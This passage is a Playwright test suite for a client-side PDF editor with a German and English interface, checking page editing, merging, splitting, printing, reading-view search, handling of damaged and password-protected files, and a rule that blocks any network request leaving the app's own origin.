import { expect, test as base, type Download, type Page } from '@playwright/test';
import { unzipSync } from 'fflate';
import { readFile, rm, writeFile } from 'node:fs/promises';
import { describePdf, makeHalfBrokenPdf, makePdf, makeProtectedPdf, makeRichPdf } from '../fixtures';

const pdfFile = (name: string, bytes: Uint8Array) => ({ name, mimeType: 'application/pdf', buffer: Buffer.from(bytes) });

/** Joins all open documents into a new tab, in the order they were opened. */
async function mergeOpenTabs(page: Page, count: number) {
  await expect(page.getByRole('tab')).toHaveCount(count);
  await page.getByTestId('merge').click();
  await page.getByTestId('merge-submit').click();
  await expect(page.getByRole('tab')).toHaveCount(count + 1);
}

// a.pdf: pages 501, 502, 503 wide. b.pdf: 601, 602 (landscape). The width identifies each page in the output.
// The two files open in two tabs and are merged into a third, which is what most tests work on.
async function openFixtures(page: Page) {
  const a = await makePdf([501, 502, 503].map((width, i) => ({ width, label: `A${i + 1}` })));
  const b = await makePdf([
    { width: 601, label: 'B1' },
    { width: 602, height: 400, label: 'B2' },
  ]);
  await page.getByTestId('file-input').setInputFiles([pdfFile('a.pdf', a), pdfFile('b.pdf', b)]);
  await mergeOpenTabs(page, 2);
  await expect(page.locator('.card')).toHaveCount(5);
  await expect(page.locator('.card img')).toHaveCount(5); // all previews rendered
}

const cards = (page: Page) => page.locator('.card');
const card = (page: Page, n: number) => cards(page).nth(n);

async function downloadBytes(download: Download) {
  return new Uint8Array(await readFile((await download.path())!));
}

async function widthsAndRotations(bytes: Uint8Array) {
  return (await describePdf(bytes)).map((p) => `${p.width}@${p.rotation}`);
}

/**
 * Every test opens the app and, when it ends, checks the privacy guarantee:
 * the page only ever reads (GET) from its own origin, and nothing is logged as an error.
 * Anything else is blocked on the spot and fails the test, so no file content can leave the browser.
 */
const test = base.extend<{ app: Page }>({
  app: async ({ page, context, baseURL }, use) => {
    const origin = new URL(baseURL!).origin;
    const forbidden: string[] = [];
    const errors: string[] = [];
    const isAllowed = (method: string, rawUrl: string) => {
      const url = new URL(rawUrl);
      if (url.protocol === 'data:') return true;
      // blob: URLs carry the origin that created them.
      return url.origin === origin && method === 'GET';
    };
    await context.route('**/*', (route) => {
      const request = route.request();
      if (isAllowed(request.method(), request.url())) return route.continue();
      forbidden.push(`${request.method()} ${request.url()}`);
      return route.abort();
    });
    // Second net for requests that never reach the router.
    context.on('request', (request) => {
      const entry = `${request.method()} ${request.url()}`;
      if (!isAllowed(request.method(), request.url()) && !forbidden.includes(entry)) forbidden.push(entry);
    });
    page.on('pageerror', (e) => errors.push(e.message));
    page.on('console', (m) => {
      if (m.type() === 'error') errors.push(m.text());
    });
    await page.goto('/');
    await use(page);
    expect(forbidden, 'requests other than GET to the own origin').toEqual([]);
    expect(errors, 'console errors').toEqual([]);
  },
});

test('shows the empty state with the privacy promise', async ({ app: page }) => {
  await expect(page.getByRole('heading', { name: 'PDFgoat' })).toBeVisible();
  await expect(page.getByText('Nichts wird hochgeladen')).toBeVisible();
  await expect(page.getByRole('heading', { name: 'PDFs bearbeiten, ohne Upload.' })).toBeVisible();
  await expect(page.getByRole('button', { name: 'PDF auswählen' })).toBeVisible();
  await expect(page.getByRole('toolbar')).toHaveCount(0); // the tools appear once a file is open
  await expect(page.locator('html')).toHaveAttribute('lang', 'de');
});

test('merges two files after rotating, deleting and reordering', async ({ app: page }) => {
  await openFixtures(page);
  await expect(page.getByText('5 Seiten aus 2 Dateien')).toBeVisible();

  await card(page, 0).getByLabel('Im Uhrzeigersinn drehen').click(); // A1 → 90°
  await card(page, 1).getByLabel('Seite löschen').click(); // A2 gone: A1 A3 B1 B2
  await card(page, 3).dragTo(card(page, 1), { targetPosition: { x: 5, y: 50 } }); // B2 before A3
  await expect(cards(page)).toHaveCount(4);

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('zusammengefuegt.pdf');
  expect(await widthsAndRotations(await downloadBytes(file))).toEqual(['501@90', '602@0', '503@0', '601@0']);
});

test('undo restores the previous order', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 0).getByLabel('Nach rechts verschieben').click();
  await page.getByRole('button', { name: 'Reihenfolge umkehren' }).click();
  await page.keyboard.press('Control+z');
  await page.getByRole('button', { name: 'Rückgängig' }).click();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual([
    '501@0', '502@0', '503@0', '601@0', '602@0',
  ]);
});

test('redo brings back what undo removed, by button and by keyboard', async ({ app: page }) => {
  await openFixtures(page);
  const redo = page.getByRole('button', { name: 'Wiederholen' });
  await expect(redo).toBeDisabled();

  await card(page, 0).getByLabel('Seite löschen').click(); // A1 gone
  await page.getByRole('button', { name: 'Reihenfolge umkehren' }).click();
  await page.keyboard.press('Control+z');
  await page.keyboard.press('Control+z');
  await expect(cards(page)).toHaveCount(5);
  await redo.click(); // A1 gone again
  await page.keyboard.press('Control+y'); // reversed again
  await expect(redo).toBeDisabled();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual([
    '602@0', '601@0', '503@0', '502@0',
  ]);
});

test('rotates and deletes a shift-click selection', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 1).locator('.card-thumb').click();
  await card(page, 3).locator('.card-thumb').click({ modifiers: ['Shift'] });
  await expect(page.getByText('3 ausgewählt')).toBeVisible();
  await page.getByRole('button', { name: 'Links drehen' }).click();
  await page.keyboard.press('Escape'); // clear the selection
  await card(page, 4).locator('.card-thumb').click();
  await page.keyboard.press('Delete');
  await expect(cards(page)).toHaveCount(4);

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Zusammengefügt speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual([
    '501@0', '502@270', '503@270', '601@270',
  ]);
});

test('no longer counts a file once all of its pages are deleted', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 4).getByLabel('Seite löschen').click();
  await card(page, 3).getByLabel('Seite löschen').click();
  await expect(page.locator('.status')).toContainText('3 Seiten');
  await expect(page.locator('.status')).not.toContainText('Dateien');

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'PDF speichern' }).click();
  expect((await download).suggestedFilename()).toBe('a.pdf');
});

// Sync folders, scanners and cleaned-up download folders change files behind the browser's back.
test('still saves the opened pages after the file on disk was overwritten and deleted', async ({ app: page }, testInfo) => {
  const path = testInfo.outputPath('vertrag.pdf');
  await writeFile(path, await makePdf([{ width: 501 }, { width: 502 }]));
  await page.getByTestId('file-input').setInputFiles(path);
  await expect(cards(page)).toHaveCount(2);

  await writeFile(path, await makePdf([{ width: 999 }]));
  await rm(path);
  await card(page, 0).getByLabel('Im Uhrzeigersinn drehen').click();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'PDF speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual(['501@90', '502@0']);
});

test('splits by page ranges into a ZIP', async ({ app: page }) => {
  await openFixtures(page);
  await page.getByRole('button', { name: 'Aufteilen', exact: false }).first().click();
  await page.getByRole('textbox', { name: 'Seitenbereiche' }).fill('1-2, 3, 4-');

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Aufteilen & herunterladen' }).click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('zusammengefuegt-aufgeteilt.zip');

  const parts = unzipSync(await downloadBytes(file));
  expect(Object.keys(parts)).toEqual([
    'zusammengefuegt-01_S1-2.pdf',
    'zusammengefuegt-02_S3.pdf',
    'zusammengefuegt-03_S4-5.pdf',
  ]);
  expect(await widthsAndRotations(parts['zusammengefuegt-03_S4-5.pdf'])).toEqual(['601@0', '602@0']);
});

test('shows an error for an invalid range and keeps the dialog open', async ({ app: page }) => {
  await openFixtures(page);
  await page.getByRole('button', { name: /Aufteilen/ }).first().click();
  await page.getByRole('textbox', { name: 'Seitenbereiche' }).fill('2-9');
  await page.getByRole('button', { name: 'Aufteilen & herunterladen' }).click();
  await expect(page.getByRole('alert')).toContainText('außerhalb von 1–5');
  await expect(page.getByRole('dialog')).toBeVisible();
});

test('saves the selection as one PDF', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 4).locator('.card-thumb').click();
  await card(page, 0).locator('.card-thumb').click();
  await page.getByRole('button', { name: /Aufteilen/ }).first().click();

  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Aufteilen & herunterladen' }).click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('zusammengefuegt-auswahl.pdf');
  expect(await widthsAndRotations(await downloadBytes(file))).toEqual(['501@0', '602@0']);
});

test('opens the large preview and steps through pages', async ({ app: page }) => {
  await openFixtures(page);
  await card(page, 1).locator('.card-thumb').dblclick();
  const dialog = page.getByRole('dialog');
  await expect(dialog).toContainText('Seite 2 von 5');
  await expect(dialog.locator('img')).toBeVisible();
  await page.keyboard.press('ArrowRight');
  await expect(dialog).toContainText('Seite 3 von 5');
  await page.keyboard.press('Escape');
  await expect(dialog).toBeHidden();
});

test('renders previews only for pages near the visible area', async ({ app: page }) => {
  const many = await makePdf(Array.from({ length: 80 }, () => ({ width: 300, height: 400 })));
  await page.getByTestId('file-input').setInputFiles(pdfFile('viele.pdf', many));
  await expect(cards(page)).toHaveCount(80);
  await expect(card(page, 0).locator('img')).toBeVisible();

  const last = card(page, 79);
  await expect(last.locator('img')).toHaveCount(0);
  expect(await page.locator('.card img').count()).toBeLessThan(80);

  await last.scrollIntoViewIfNeeded();
  await expect(last.locator('img')).toBeVisible();
});

test.describe('tabs', () => {
  async function openTwo(page: Page) {
    const a = await makePdf([501, 502, 503].map((width) => ({ width })));
    const b = await makePdf([601, 602].map((width) => ({ width })));
    await page.getByTestId('file-input').setInputFiles([pdfFile('a.pdf', a), pdfFile('b.pdf', b)]);
    await expect(page.getByRole('tab')).toHaveCount(2);
  }
  const tab = (page: Page, name: string) => page.getByRole('tab', { name, exact: true });

  test('opens every file in its own tab with its own pages and history', async ({ app: page }) => {
    await openTwo(page);
    await expect(tab(page, 'b.pdf')).toHaveAttribute('aria-selected', 'true');
    await expect(cards(page)).toHaveCount(2);

    await tab(page, 'a.pdf').click();
    await expect(cards(page)).toHaveCount(3);
    await card(page, 0).hover();
    await card(page, 0).getByRole('button', { name: /löschen/i }).click();
    await expect(cards(page)).toHaveCount(2);

    await tab(page, 'b.pdf').click();
    await expect(cards(page)).toHaveCount(2);
    await expect(page.getByRole('button', { name: /Rückgängig/ })).toBeDisabled();
    await tab(page, 'a.pdf').click();
    await page.getByRole('button', { name: /Rückgängig/ }).click();
    await expect(cards(page)).toHaveCount(3);
  });

  test('never undoes the opening of a file', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }])));
    await expect(cards(page)).toHaveCount(1);
    await expect(page.getByRole('button', { name: /Rückgängig/ })).toBeDisabled();
    await page.keyboard.press('Control+z');
    await expect(cards(page)).toHaveCount(1);
  });

  test('asks before closing a tab with changes, but not one without', async ({ app: page }) => {
    await openTwo(page);
    page.once('dialog', (d) => {
      throw new Error(`unexpected dialog: ${d.message()}`);
    });
    await page.getByRole('button', { name: 'b.pdf schließen' }).click();
    await expect(page.getByRole('tab')).toHaveCount(1);
    page.removeAllListeners('dialog');

    await card(page, 0).hover();
    await card(page, 0).getByRole('button', { name: /löschen/i }).click();
    page.once('dialog', (d) => d.dismiss());
    await page.getByRole('button', { name: 'a.pdf schließen' }).click();
    await expect(page.getByRole('tab')).toHaveCount(1);
    page.once('dialog', (d) => d.accept());
    await page.getByRole('button', { name: 'a.pdf schließen' }).click();
    await expect(page.getByRole('tab')).toHaveCount(0);
    await expect(page.getByRole('button', { name: 'PDF auswählen' })).toBeVisible();
  });

  test('merges chosen documents in the chosen order into a new tab, leaving the others as they are', async ({ app: page }) => {
    await openTwo(page);
    await page.getByTestId('merge').click();
    await page.getByRole('button', { name: 'b.pdf nach oben' }).click();
    await page.getByTestId('merge-submit').click();
    await expect(tab(page, 'Zusammengefügt')).toHaveAttribute('aria-selected', 'true');
    await expect(cards(page)).toHaveCount(5);

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: /Zusammengefügt speichern/ }).click();
    expect(await widthsAndRotations(await downloadBytes(await download))).toEqual(
      ['601@0', '602@0', '501@0', '502@0', '503@0'],
    );
    await tab(page, 'a.pdf').click();
    await expect(cards(page)).toHaveCount(3);
  });

  test('keeps the files of a merged document after the original tabs are closed', async ({ app: page }) => {
    await openTwo(page);
    await page.getByTestId('merge').click();
    await page.getByTestId('merge-submit').click();
    await page.getByRole('button', { name: 'a.pdf schließen' }).click();
    await page.getByRole('button', { name: 'b.pdf schließen' }).click();
    await expect(page.getByRole('tab')).toHaveCount(1);
    await expect(card(page, 0).locator('img')).toBeVisible();

    const download = page.waitForEvent('download');
    await page.getByRole('button', { name: /Zusammengefügt speichern/ }).click();
    expect((await describePdf(await downloadBytes(await download))).map((p) => p.width)).toEqual([501, 502, 503, 601, 602]);
  });

  test('comes back to the place in the reading view when switching tabs', async ({ app: page }) => {
    await openTwo(page);
    await tab(page, 'a.pdf').click();
    await page.getByRole('button', { name: 'Lesen', exact: true }).click();
    await page.locator('.reader-scroll').focus();
    await page.keyboard.press('End');
    await expect(page.getByRole('textbox', { name: /Seite/ })).toHaveValue('3');

    await tab(page, 'b.pdf').click();
    await expect(page.locator('.reader')).toHaveCount(0);
    await tab(page, 'a.pdf').click();
    await expect(page.locator('.reader')).toBeVisible();
    await expect(page.getByRole('textbox', { name: /Seite/ })).toHaveValue('3');
  });
});

test.describe('command palette', () => {
  const palette = (page: Page) => page.getByRole('dialog', { name: 'Befehle' });
  const box = (page: Page) => palette(page).getByRole('combobox');

  test('opens with Ctrl+K, filters while typing and runs the chosen command with Enter', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }, { width: 400 }])));
    await expect(cards(page)).toHaveCount(2);
    await page.keyboard.press('Control+k');
    await expect(palette(page)).toBeVisible();
    await box(page).fill('lesen');
    await expect(palette(page).getByRole('option')).toHaveCount(1);
    await box(page).press('Enter');
    await expect(palette(page)).toHaveCount(0);
    await expect(page.locator('.reader')).toBeVisible();
  });

  test('only offers commands that can run now', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }, { width: 400 }])));
    await expect(cards(page)).toHaveCount(2);
    await page.keyboard.press('Control+k');
    await box(page).fill('drehen');
    await expect(palette(page)).toContainText('Kein passender Befehl');
    await page.keyboard.press('Escape');

    await card(page, 0).getByRole('button', { name: /Seite 1 auswählen/ }).click();
    await page.keyboard.press('Control+k');
    await box(page).fill('rechts dreh');
    await box(page).press('Enter');
    await expect(card(page, 0).locator('img')).toHaveCSS('transform', /matrix\(0, 1, -1, 0/);
  });

  test('moves through the list with the arrow keys and closes with Escape', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }])));
    await expect(cards(page)).toHaveCount(1);
    await page.keyboard.press('Control+k');
    const options = palette(page).getByRole('option');
    await expect(options.first()).toHaveAttribute('aria-selected', 'true');
    await box(page).press('ArrowDown');
    await expect(options.nth(1)).toHaveAttribute('aria-selected', 'true');
    await box(page).press('Escape');
    await expect(palette(page)).toHaveCount(0);
  });

  test('is available on the start page too', async ({ app: page }) => {
    await page.keyboard.press('Control+k');
    await box(page).fill('öffnen');
    await expect(palette(page).getByRole('option')).toHaveCount(1);
  });

  test('finds commands in English as well', async ({ app: page }) => {
    await page.getByRole('button', { name: 'English' }).click();
    await page.getByTestId('file-input').setInputFiles(pdfFile('a.pdf', await makePdf([{ width: 300 }])));
    await expect(cards(page)).toHaveCount(1);
    await page.keyboard.press('Control+k');
    await page.getByRole('dialog', { name: 'Commands' }).getByRole('combobox').fill('print');
    await expect(page.getByRole('option', { name: /Print/ })).toBeVisible();
  });
});

test.describe('printing', () => {
  // The print dialog cannot be driven in a test, so print() only records what is on the page.
  test.beforeEach(async ({ app: page }) => {
    await page.evaluate(() => {
      const w = window as unknown as { printed: { images: number; classes: string[] }[] };
      w.printed = [];
      window.print = () => {
        const images = [...document.querySelectorAll<HTMLImageElement>('.print-sheet img')];
        w.printed.push({ images: images.length, classes: images.map((i) => i.className) });
      };
    });
  });
  const printed = (page: Page) => page.evaluate(() => (window as unknown as { printed: unknown[] }).printed);

  test('draws the edited page list and prints it, then frees the images', async ({ app: page }) => {
    await openFixtures(page);
    await card(page, 1).hover();
    await card(page, 1).getByRole('button', { name: /löschen/i }).click();
    await page.getByRole('button', { name: /Drucken/ }).click();
    await expect.poll(() => printed(page)).toHaveLength(1);
    expect(await printed(page)).toEqual([{ images: 4, classes: [...Array(3).fill('print-page portrait'), 'print-page landscape'] }]);
    await expect(page.locator('.print-sheet img')).toHaveCount(4);

    await page.evaluate(() => window.dispatchEvent(new Event('afterprint')));
    await expect(page.locator('.print-sheet')).toHaveCount(0);
  });

  test('prints wide pages in landscape', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('quer.pdf', await makePdf([{ width: 800, height: 400 }, { width: 400 }])));
    await expect(cards(page)).toHaveCount(2);
    await page.keyboard.press('Control+p');
    await expect.poll(() => printed(page)).toHaveLength(1);
    expect(await printed(page)).toEqual([{ images: 2, classes: ['print-page landscape', 'print-page portrait'] }]);
  });

  test('hides the editor when printing', async ({ app: page }) => {
    await openFixtures(page);
    await page.getByRole('button', { name: /Drucken/ }).click();
    await expect.poll(() => printed(page)).toHaveLength(1);
    await page.emulateMedia({ media: 'print' });
    await expect(page.locator('.shell')).toBeHidden();
    await expect(page.locator('.print-sheet')).toBeVisible();
  });
});

test.describe('reading view', () => {
  const read = (page: Page) => page.getByRole('button', { name: 'Lesen', exact: true }).click();
  const pageField = (page: Page) => page.getByRole('textbox', { name: /Seite/ });
  const scroller = (page: Page) => page.locator('.reader-scroll');

  test('shows all pages in a continuous view and draws the ones in sight', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    await expect(page.locator('.read-page')).toHaveCount(5);
    await expect(page.locator('.read-page img').first()).toBeVisible();
    await expect(pageField(page)).toHaveValue('1');
    await expect(page.getByText('von 5')).toBeVisible();
  });

  test('follows edits made in the page view', async ({ app: page }) => {
    await openFixtures(page);
    await card(page, 0).hover();
    await card(page, 0).getByRole('button', { name: /löschen/i }).click();
    await read(page);
    await expect(page.locator('.read-page')).toHaveCount(4);
  });

  test('zooms with the buttons and the list', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    const before = await page.locator('.read-page').first().boundingBox();
    await page.getByRole('button', { name: 'Vergrößern' }).click();
    await expect(page.locator('.zoom-now')).toHaveText(/^\d+ %$/);
    const after = await page.locator('.read-page').first().boundingBox();
    expect(after!.width).toBeGreaterThan(before!.width);

    await page.getByRole('combobox', { name: 'Zoom' }).selectOption('50');
    await expect(page.locator('.zoom-now')).toHaveText('50 %');
    const small = await page.locator('.read-page').first().boundingBox();
    expect(Math.round(small!.width)).toBe(Math.round(501 * (96 / 72) * 0.5));
  });

  test('pages with the keyboard and jumps to a typed page number', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    await scroller(page).focus();
    await page.keyboard.press('End');
    await expect(pageField(page)).toHaveValue('5');
    await page.keyboard.press('Home');
    await expect(pageField(page)).toHaveValue('1');
    await page.keyboard.press('PageDown');
    await expect(pageField(page)).toHaveValue('2');

    await pageField(page).fill('4');
    await pageField(page).press('Enter');
    await expect(pageField(page)).toHaveValue('4');
    await expect(page.locator('.read-page[data-page="4"] img')).toBeVisible();
  });

  test('puts selectable text over the page', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    const line = page.locator('.read-page[data-page="1"] .text-layer span');
    await expect(line).toHaveText('A1');
    await line.click({ clickCount: 3 });
    expect(await page.evaluate(() => window.getSelection()?.toString().trim())).toBe('A1');
  });

  test('finds text, counts the matches and jumps to them', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    const search = page.getByRole('searchbox', { name: 'Im Dokument suchen' });
    await search.fill('a');
    await expect(page.locator('.search-state')).toHaveText('1 von 3');
    await search.press('Enter');
    await expect(page.locator('.search-state')).toHaveText('2 von 3');
    await expect(pageField(page)).toHaveValue('2');
    await expect(page.locator('.hit.active')).toBeVisible();
    await search.press('Shift+Enter');
    await search.press('Shift+Enter');
    await expect(page.locator('.search-state')).toHaveText('3 von 3');
    await expect(pageField(page)).toHaveValue('3');

    await search.fill('a3');
    await expect(page.locator('.search-state')).toHaveText('1 von 1');
    await expect(pageField(page)).toHaveValue('3');
    await search.fill('gibtsnicht');
    await expect(page.locator('.search-state')).toHaveText('Nichts gefunden');
    await expect(page.locator('.hit')).toHaveCount(0);
  });

  test('Ctrl+F searches the document instead of the browser', async ({ app: page }) => {
    await openFixtures(page);
    await read(page);
    await scroller(page).focus();
    await page.keyboard.press('Control+f');
    await expect(page.getByRole('searchbox', { name: 'Im Dokument suchen' })).toBeFocused();
  });

  test('keeps highlights in place on a rotated page', async ({ app: page }) => {
    await openFixtures(page);
    await card(page, 0).getByRole('button', { name: /Seite 1 auswählen/ }).click();
    await page.getByRole('button', { name: /Rechts drehen/ }).click();
    await read(page);
    await page.getByRole('searchbox', { name: 'Im Dokument suchen' }).fill('A1');
    const hit = page.locator('.read-page[data-page="1"] .hit.active');
    await expect(hit).toBeVisible();
    const pageBox = (await page.locator('.read-page[data-page="1"]').boundingBox())!;
    const hitBox = (await hit.boundingBox())!;
    expect(hitBox.x).toBeGreaterThanOrEqual(pageBox.x - 1);
    expect(hitBox.x + hitBox.width).toBeLessThanOrEqual(pageBox.x + pageBox.width + 1);
    expect(hitBox.y).toBeGreaterThanOrEqual(pageBox.y - 1);
    expect(hitBox.y + hitBox.height).toBeLessThanOrEqual(pageBox.y + pageBox.height + 1);
  });

  const openRich = async (page: Page, ...tags: string[]) => {
    await page.getByTestId('file-input').setInputFiles(
      await Promise.all(tags.map(async (tag) => pdfFile(`${tag}.pdf`, await makeRichPdf(tag, 500)))),
    );
    if (tags.length > 1) await mergeOpenTabs(page, tags.length);
    await expect(cards(page)).toHaveCount(3 * tags.length);
    await read(page);
  };
  const sidebar = (page: Page) => page.getByRole('complementary', { name: 'Seitenleiste' });

  test('jumps to a page from its thumbnail in the sidebar', async ({ app: page }) => {
    await openRich(page, 'A');
    await page.getByRole('button', { name: 'Seitenleiste' }).click();
    await expect(sidebar(page).locator('.thumb')).toHaveCount(3);
    await expect(sidebar(page).locator('.thumb img').first()).toBeVisible();
    await sidebar(page).getByRole('button', { name: 'Zu Seite 3' }).click();
    await expect(pageField(page)).toHaveValue('3');
    await expect(sidebar(page).getByRole('button', { name: 'Zu Seite 3' })).toHaveAttribute('aria-current', 'page');
  });

  test('lists bookmarks and jumps to their pages', async ({ app: page }) => {
    await openRich(page, 'A');
    await page.getByRole('button', { name: 'Seitenleiste' }).click();
    await sidebar(page).getByRole('tab', { name: 'Lesezeichen' }).click();
    await sidebar(page).getByRole('button', { name: 'A Drei', exact: true }).click();
    await expect(pageField(page)).toHaveValue('3');
    await sidebar(page).getByRole('button', { name: 'A Zwei innen' }).click();
    await expect(pageField(page)).toHaveValue('2');
  });

  test('greys out a bookmark whose page was deleted', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('A.pdf', await makeRichPdf('A', 500)));
    await expect(cards(page)).toHaveCount(3);
    await card(page, 2).hover();
    await card(page, 2).getByRole('button', { name: /löschen/i }).click();
    await read(page);
    await page.getByRole('button', { name: 'Seitenleiste' }).click();
    await sidebar(page).getByRole('tab', { name: 'Lesezeichen' }).click();
    await expect(sidebar(page).getByRole('button', { name: 'A Drei', exact: true })).toBeDisabled();
    await expect(sidebar(page).getByRole('button', { name: 'A Eins' })).toBeEnabled();
  });

  test('gives every file its own heading in the bookmarks', async ({ app: page }) => {
    await openRich(page, 'A', 'B');
    await page.getByRole('button', { name: 'Seitenleiste' }).click();
    await sidebar(page).getByRole('tab', { name: 'Lesezeichen' }).click();
    await expect(sidebar(page).getByRole('button', { name: 'A.pdf', exact: true })).toBeVisible();
    await sidebar(page).getByRole('button', { name: 'B.pdf', exact: true }).click();
    await expect(pageField(page)).toHaveValue('4');
    await sidebar(page).getByRole('button', { name: 'B Drei', exact: true }).click();
    await expect(pageField(page)).toHaveValue('6');
  });

  test('follows links inside the file and opens web links in a new tab', async ({ app: page }) => {
    await openRich(page, 'A');
    const links = page.locator('.read-page[data-page="1"] a.page-link');
    await expect(links).toHaveCount(2);
    const web = page.locator('a.page-link[href="https://example.org/"]');
    await expect(web).toHaveAttribute('target', '_blank');
    await expect(web).toHaveAttribute('rel', /noopener/);
    await page.locator('a.page-link[title="Zu Seite 3"]').click();
    await expect(pageField(page)).toHaveValue('3');
  });

  test('shows a rotated page turned', async ({ app: page }) => {
    await openFixtures(page);
    await card(page, 0).getByRole('button', { name: /Seite 1 auswählen/ }).click();
    await page.getByRole('button', { name: /Rechts drehen/ }).click();
    await read(page);
    await page.getByRole('combobox', { name: 'Zoom' }).selectOption('100');
    const box = await page.locator('.read-page').first().boundingBox();
    expect(box!.width).toBeGreaterThan(box!.height);
  });
});

test('shows a PDF with an embedded font and starts the PDF engine only when a file is opened', async ({ app: page }) => {
  const scripts = () => page.evaluate(() => performance.getEntriesByType('resource').map((r) => r.name));
  expect((await scripts()).some((name) => name.includes('view.worker'))).toBe(false);

  const bytes = await readFile(new URL('../files/embedded-font.pdf', import.meta.url));
  await page.getByTestId('file-input').setInputFiles(pdfFile('schrift.pdf', bytes));
  await expect(card(page, 0).locator('img')).toBeVisible();
  expect((await scripts()).some((name) => name.includes('view.worker'))).toBe(true);
});

test('a damaged page shows a placeholder, and the good pages can still be saved', async ({ page }) => {
  // Not the `app` fixture: the browser reports the damaged page in its console, which is expected here.
  await page.goto('/');
  await page.getByTestId('file-input').setInputFiles(pdfFile('halb.pdf', await makeHalfBrokenPdf()));
  await expect(cards(page)).toHaveCount(2);
  await expect(card(page, 0).locator('img')).toBeVisible();
  await expect(card(page, 1)).toContainText('Keine Vorschau');

  await page.getByRole('button', { name: 'PDF speichern' }).click();
  await expect(page.getByRole('alert')).toContainText('Seite 2 von „halb.pdf“ ist beschädigt');

  await card(page, 1).getByLabel('Seite löschen').click();
  const download = page.waitForEvent('download');
  await page.getByRole('button', { name: 'PDF speichern' }).click();
  expect(await widthsAndRotations(await downloadBytes(await download))).toEqual(['501@0']);
});

test.describe('files that cannot be opened', () => {
  test('rejects files that are not PDFs', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('kaputt.pdf', Buffer.from('das ist kein pdf')));
    await expect(page.getByRole('alert')).toContainText('„kaputt.pdf“ konnte nicht als PDF gelesen werden');
    await expect(cards(page)).toHaveCount(0);
  });

  test('asks for the password of a protected PDF, retries after a wrong one and saves it unprotected', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('geheim.pdf', await makeProtectedPdf('geheim')));
    const dialog = page.getByRole('dialog');
    await expect(dialog).toContainText('„geheim.pdf“ ist passwortgeschützt');

    await dialog.getByLabel('Passwort').fill('falsch');
    await dialog.getByRole('button', { name: 'Öffnen' }).click();
    await expect(dialog.getByRole('alert')).toContainText('Das Passwort stimmt nicht');

    await dialog.getByLabel('Passwort').fill('geheim');
    await dialog.getByRole('button', { name: 'Öffnen' }).click();
    await expect(cards(page)).toHaveCount(1);
    await expect(page.getByRole('status').filter({ hasText: 'Schutz entfernt' })).toBeVisible();

    const [download] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: /PDF speichern/ }).click()]);
    const bytes = await downloadBytes(download);
    expect(await widthsAndRotations(bytes)).toEqual(['400@0']);
    // An unprotected file opens without a password.
    expect(await describePdf(bytes)).toHaveLength(1);
  });

  test('skipping the password dialog opens nothing and shows no error', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles(pdfFile('geheim.pdf', await makeProtectedPdf('geheim')));
    await page.getByRole('dialog').getByRole('button', { name: 'Überspringen' }).click();
    await expect(page.getByRole('dialog')).toHaveCount(0);
    await expect(cards(page)).toHaveCount(0);
    await expect(page.getByRole('alert')).toHaveCount(0);
  });

  // Such a file opens without a password and is saved without protection.
  test('opens a PDF that is encrypted with an owner password only', async ({ app: page }) => {
    const bytes = await readFile(new URL('../files/owner-encrypted.pdf', import.meta.url));
    await page.getByTestId('file-input').setInputFiles(pdfFile('gesperrt.pdf', bytes));
    await expect(cards(page)).toHaveCount(2);
    await expect(page.getByRole('status').filter({ hasText: 'Schutz entfernt' })).toBeVisible();
  });

  test('names every broken file and still opens the good ones', async ({ app: page }) => {
    await page.getByTestId('file-input').setInputFiles([
      pdfFile('eins.pdf', Buffer.from('kaputt')),
      pdfFile('gut.pdf', await makePdf([{ width: 300 }])),
      pdfFile('zwei.pdf', Buffer.from('auch kaputt')),
    ]);
    const alert = page.getByRole('alert');
    await expect(alert).toContainText('„eins.pdf“');
    await expect(alert).toContainText('„zwei.pdf“');
    await expect(cards(page)).toHaveCount(1);
  });
});

test.describe('languages', () => {
  test('switches to English, keeps the choice and names downloads in English', async ({ app: page }) => {
    await page.getByRole('button', { name: 'English' }).click();
    await expect(page.getByText('Nothing is uploaded')).toBeVisible();
    await expect(page.locator('html')).toHaveAttribute('lang', 'en');
    await expect(page).toHaveTitle(/edit PDFs without uploading/);

    await page.reload();
    await expect(page.getByRole('button', { name: 'Choose PDF' })).toBeVisible();

    await openFixtures(page);
    await expect(page.getByText('5 pages from 2 files')).toBeVisible();
